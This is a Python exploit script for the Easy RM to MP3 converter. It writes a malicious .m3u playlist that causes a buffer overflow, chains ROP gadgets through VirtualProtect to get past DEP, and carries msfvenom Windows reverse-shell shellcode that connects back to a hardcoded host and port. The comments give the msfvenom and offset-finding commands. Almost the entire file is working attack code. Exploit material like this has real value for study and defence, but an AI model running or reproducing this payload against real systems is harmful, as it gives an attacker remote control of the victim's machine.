#!/etc/Python
#By: Jb05s
#Purpose: Easy RM to Mp3 DEP Bypass

import struct

"""
msfvenom -p windows/shell_reverse_tcp lhost=172.16.160.131 lport=4231 -f c -b \x00\x08\x09\x0A
"""

sc = ("\xba\xc7\x89\x4b\x91\xdb\xdd\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
"\x52\x31\x50\x12\x83\xc0\x04\x03\x97\x87\xa9\x64\xeb\x70\xaf"
"\x87\x13\x81\xd0\x0e\xf6\xb0\xd0\x75\x73\xe2\xe0\xfe\xd1\x0f"
"\x8a\x53\xc1\x84\xfe\x7b\xe6\x2d\xb4\x5d\xc9\xae\xe5\x9e\x48"
"\x2d\xf4\xf2\xaa\x0c\x37\x07\xab\x49\x2a\xea\xf9\x02\x20\x59"
"\xed\x27\x7c\x62\x86\x74\x90\xe2\x7b\xcc\x93\xc3\x2a\x46\xca"
"\xc3\xcd\x8b\x66\x4a\xd5\xc8\x43\x04\x6e\x3a\x3f\x97\xa6\x72"
"\xc0\x34\x87\xba\x33\x44\xc0\x7d\xac\x33\x38\x7e\x51\x44\xff"
"\xfc\x8d\xc1\x1b\xa6\x46\x71\xc7\x56\x8a\xe4\x8c\x55\x67\x62"
"\xca\x79\x76\xa7\x61\x85\xf3\x46\xa5\x0f\x47\x6d\x61\x4b\x13"
"\x0c\x30\x31\xf2\x31\x22\x9a\xab\x97\x29\x37\xbf\xa5\x70\x50"
"\x0c\x84\x8a\xa0\x1a\x9f\xf9\x92\x85\x0b\x95\x9e\x4e\x92\x62"
"\xe0\x64\x62\xfc\x1f\x87\x93\xd5\xdb\xd3\xc3\x4d\xcd\x5b\x88"
"\x8d\xf2\x89\x1f\xdd\x5c\x62\xe0\x8d\x1c\xd2\x88\xc7\x92\x0d"
"\xa8\xe8\x78\x26\x43\x13\xeb\xe5\x84\xbb\x68\x9d\xa6\xbb\x7e"
"\xd9\x2e\x5d\x14\xf5\x66\xf6\x81\x6c\x23\x8c\x30\x70\xf9\xe9"
"\x73\xfa\x0e\x0e\x3d\x0b\x7a\x1c\xaa\xfb\x31\x7e\x7d\x03\xec"
"\x16\xe1\x96\x6b\xe6\x6c\x8b\x23\xb1\x39\x7d\x3a\x57\xd4\x24"
"\x94\x45\x25\xb0\xdf\xcd\xf2\x01\xe1\xcc\x77\x3d\xc5\xde\x41"
"\xbe\x41\x8a\x1d\xe9\x1f\x64\xd8\x43\xee\xde\xb2\x38\xb8\xb6"
"\x43\x73\x7b\xc0\x4b\x5e\x0d\x2c\xfd\x37\x48\x53\x32\xd0\x5c"
"\x2c\x2e\x40\xa2\xe7\xea\x70\xe9\xa5\x5b\x19\xb4\x3c\xde\x44"
"\x47\xeb\x1d\x71\xc4\x19\xde\x86\xd4\x68\xdb\xc3\x52\x81\x91"
"\x5c\x37\xa5\x06\x5c\x12")

putESP = struct.pack('<L', 0x5ad79277) #PUSH ESP; MOV EAX,EDX; POP EDI; RETN
putESP += struct.pack('<L', 0x77C1E842) #PUSH EDI; POP EAX; POP EBP; RETN
putESP += struct.pack('<L', 0x41414141) #For the POP EBP
putESP += struct.pack('<L', 0x1001653D) #ADD ESP,20; RETN

VirtualProtect = struct.pack('<L', 0x7C801AD4) #VirtualProtect()
VirtualProtect += struct.pack('<L', 0x44444444) #RetnAddress
VirtualProtect += struct.pack('<L', 0x45454545) #lpAddress
VirtualProtect += struct.pack('<L', 0x46464646) #dwSize - len(sc)
VirtualProtect += struct.pack('<L', 0x47474747) #flNewProtect
VirtualProtect += struct.pack('<L', 0x10035005) #lpflOldProtect (Writeable)
VirtualProtect += struct.pack('<L', 0x41414141)
VirtualProtect += struct.pack('<L', 0x41414141)

#Shellcode pointer in EAX
retnAddr = struct.pack('<L', 0x763C982F) #XCHG ESI,EDI; DEC ECX; RETN 4
retnAddr += struct.pack('<L', 0x1002DC4C) #ADD EAX,100; POP EBP; RETN
retnAddr += struct.pack('<L', 0x41414141) #For RETN 4
retnAddr += struct.pack('<L', 0x41414141) 

#RetnAddress in EAX (Parameter 1)
retnAddr += struct.pack('<L', 0x77E84115) #MOV DWORD PTR DS:[ESI+10],EAX; MOV EAX,ESI; POP ESI; RETN
retnAddr += struct.pack('<L', 0x41414141) 

retnAddr += struct.pack('<L', 0x775D131E) #PUSH EAX; POP ESI; RETN
retnAddr += struct.pack('<L', 0x1002DC4C) #ADD EAX,100; RETN
retnAddr += struct.pack('<L', 0x41414141)

retnAddr += struct.pack('<L', 0x77157D1D) #INC ESI; RETN
retnAddr += struct.pack('<L', 0x77157D1D) #INC ESI; RETN
retnAddr += struct.pack('<L', 0x77157D1D) #INC ESI; RETN
retnAddr += struct.pack('<L', 0x77157D1D) #INC ESI; RETN

#lpAddress (Parameter 2)
retnAddr += struct.pack('<L', 0x77E84115) #MOV DWORD PTR DS:[ESI+10],EAX; MOV EAX,ESI; POP ESI; RETN
retnAddr += struct.pack('<L', 0x41414141)

retnAddr += struct.pack('<L', 0x775D131E) #PUSH EAX; POP ESI; RETN

retnAddr += struct.pack('<L', 0x100307A9) #XOR EAX,EAX; RETN
retnAddr += struct.pack('<L', 0x1002DC4C) #ADD EAX,100; RETN
retnAddr += struct.pack('<L', 0x41414141)
retnAddr += struct.pack('<L', 0x1002DC4C) #ADD EAX,100; RETN
retnAddr += struct.pack('<L', 0x41414141)
retnAddr += struct.pack('<L', 0x1002DC4C) #ADD EAX,100; RETN
retnAddr += struct.pack('<L', 0x41414141)

retnAddr += struct.pack('<L', 0x77157D1D) #INC ESI; RETN
retnAddr += struct.pack('<L', 0x77157D1D) #INC ESI; RETN
retnAddr += struct.pack('<L', 0x77157D1D) #INC ESI; RETN
retnAddr += struct.pack('<L', 0x77157D1D) #INC ESI; RETN

#dwSize - len(sc) (Parameter 3)
retnAddr += struct.pack('<L', 0x77E84115) #MOV DWORD PTR DS:[ESI+10],EAX; MOV EAX,ESI; POP ESI; RETN
retnAddr += struct.pack('<L', 0x41414141)

retnAddr += struct.pack('<L', 0x775D131E) #PUSH EAX; POP ESI; RETN

retnAddr += struct.pack('<L', 0x10010C77) #XOR EAX,EAX; RETN
retnAddr += struct.pack('<L', 0x1002DC41) #ADD EAX,40; POP EBP; RETN
retnAddr += struct.pack('<L', 0x41414141)
retnAddr += struct.pack('<L', 0x77157D1D) #INC ESI; RETN
retnAddr += struct.pack('<L', 0x77157D1D) #INC ESI; RETN
retnAddr += struct.pack('<L', 0x77157D1D) #INC ESI; RETN
retnAddr += struct.pack('<L', 0x77157D1D) #INC ESI; RETN

#flNewProtect (Parameter 4)
retnAddr += struct.pack('<L', 0x77E84115) #MOV DWORD PTR DS:[ESI+10],EAX; MOV EAX,ESI; POP ESI; RETN
retnAddr += struct.pack('<L', 0x41414141)
retnAddr += struct.pack('<L', 0x775D12F1) #SUB EAX,4; RETN
retnAddr += struct.pack('<L', 0x775D12F1) #SUB EAX,4; RETN
retnAddr += struct.pack('<L', 0x73DF5CA8) #PUSH EAX; POP ESP; MOV EAX,EDI; POP EDI; POP ESI; RETN

"""
./pattern_create.rb -l 30000
./pattern_offset.rb -q 0Hl1 -l 30000
[*] Exact match at offset 5792
[*] Exact match at offset 26072
"""

pre = "\x41" * 26072
eip = struct.pack('<L', 0x100102DC) #RETN
comp = struct.pack('<L', 0x41414141)
nop = "\x90" * 300
pad = "\x43" * (30000 - len(pre + eip + comp + putESP + VirtualProtect + retnAddr + nop + sc))

buffer = pre + eip + comp + putESP + VirtualProtect + retnAddr + nop + sc + pad

exploit = buffer

filename = "jb05s.m3u"
textfile = open(filename, "w")
textfile.write(exploit)
textfile.close()
